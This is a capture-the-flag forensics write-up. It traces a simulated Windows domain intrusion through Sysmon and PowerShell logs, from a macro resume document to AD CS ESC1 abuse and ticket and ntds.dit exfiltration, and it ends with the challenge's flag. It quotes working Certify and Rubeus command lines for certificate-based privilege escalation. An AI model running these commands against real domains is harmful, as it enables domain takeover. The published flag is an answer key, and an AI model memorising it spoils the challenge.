# We have an incident! — Writeup

- Category: Forensics
- Value: 1000
- Author: @Alkimor1

## Challenge

> У нас в компании, кажется, произошёл инцидент, пока ничего не ясно, мы изолировали определённые машины от греха подальше. Команда реагирования плотно сотрудничает с вирусными аналитиками. Чтобы облегчить себе работу, нужно предоставить им ВПО, которые вы должны будете найти. Также есть подозрения, что производилась эксфильтрация. Выясните, что же произошло.
>
> **Формат флага:** `KubSTU{Уязвимость элемента/атака,которая привела к эскалации привилегий:Список ВПО, включая их расширения:Данные, которые эксфильтровали}`
>
> **Внимание!** Списки указывайте в порядке их временных меток запуска с учётом регистра, от раннего к позднему. В случае эксфильтрации также.

## Recon

`bsdtar -tf files/10_We_have_an_incident.rar` shows two KAPE-style host collections: `HR/` and `AD/`.

The useful logs are:

- `HR/C/Windows/System32/winevt/logs/Microsoft-Windows-Sysmon%4Operational.evtx`
- `HR/C/Windows/System32/winevt/logs/Windows PowerShell.evtx`
- `AD/C/Windows/System32/winevt/logs/Windows PowerShell.evtx`

The first important split is that the February `wsmprovhost.exe` activity on the HR workstation is lure staging, not the actual launch chain. The classic PowerShell log shows `KUBAN\\admin` remotely creating bait files such as:

- `C:\Users\Elvira\Downloads\Счета\счет_123.pdf`
- `C:\Users\Elvira\Downloads\Презентации\HR_презентация.pptx`
- `C:\Users\Elvira\Downloads\Презентации\HR_план_2026.pptx`
- `C:\Users\Elvira\Downloads\Счета\счет_февраль.pdf.url`

Those files are background staging. The real execution on March 28 starts elsewhere.

## Solve

The previous wrong answers had two issues: they over-counted URL-only bootstrap stages, and they used the wrong privilege-escalation label. HR Sysmon shows the successful chain starts with Word opening a macro document:

- `WINWORD.EXE /n "C:\Users\Elvira\Downloads\Резюме.docm" /o ""`
- That `WINWORD.EXE` process spawns a hidden PowerShell bootstrap that pulls `runme.txt`, which in turn evaluates `implant.ps1` from the attacker server.

Those two URLs are part of the in-memory bootstrap, but they are not separate local samples in the launched-malware list. The blocked February `документ_к_подписи.lnk` also stays out: Defender quarantines it on `2026-02-28`, and the evidence does not show a successful payload launch from it.

The privilege escalation itself is visible in HR Sysmon:

- `Certify.exe request /ca:DC1.kuban.loc\\kuban-DC1-CA /template:VulnerableUserSAN /altname:admin`
- `Rubeus.exe asktgt /user:admin /certificate:C:\Users\Public\admin.pfx /password: /nowrap /ptt`

That is AD CS abuse via an `ESC1` vulnerable template. The challenge expects the attack identifier `ESC1`, not the broader component name `ADCS` and not the combined form `ADCS_ESC1`.

The malware order must follow launch time, not first network visibility or first file creation. The successful March 28 chain on the HR workstation is:

1. `Резюме.docm` — `WINWORD.EXE` opens it at `2026-03-28 13:20:43`
2. `Certify.exe` — first Sysmon process-create at `2026-03-28 13:21:34`
3. `Rubeus.exe` — first Sysmon process-create at `2026-03-28 13:31:34`
4. `mimikatz.exe` — first Sysmon process-create at `2026-03-28 13:31:55`
5. `wlmss.exe` — first successful launch at `2026-03-28 13:54:27`

The exfiltration is reconstructed from the classic PowerShell logs:

- On HR, the implant sends the exported TGT:
  - `C:\Users\Public\0-40e10000-admin@krbtgt~kuban.loc-KUBAN.LOC.kirbi`
  - PowerShell command opens `TcpClient('192.168.100.54',9000)` and writes the file bytes.
- On AD, the attacker lands a remote shell on `DC1`, stages VSS dump artifacts, then sends:
  - `C:\Users\Public\ntds.dit`
  - PowerShell command opens `TcpClient('192.168.100.54',9001)` and writes the file bytes.

`SYSTEM` was copied to `C:\Users\Public\SYSTEM`, but the captured logs do not show a subsequent transmit command for it, so it should not be included in the flag.

## Flag

```text
KubSTU{ESC1:Резюме.docm_Certify.exe_Rubeus.exe_mimikatz.exe_wlmss.exe:0-40e10000-admin@krbtgt~kuban.loc-KUBAN.LOC.kirbi_ntds.dit}
```

## Files

- [challenge.md](challenge.md)
- [scripts/solve.py](scripts/solve.py)
- [solution/flag.txt](solution/flag.txt)
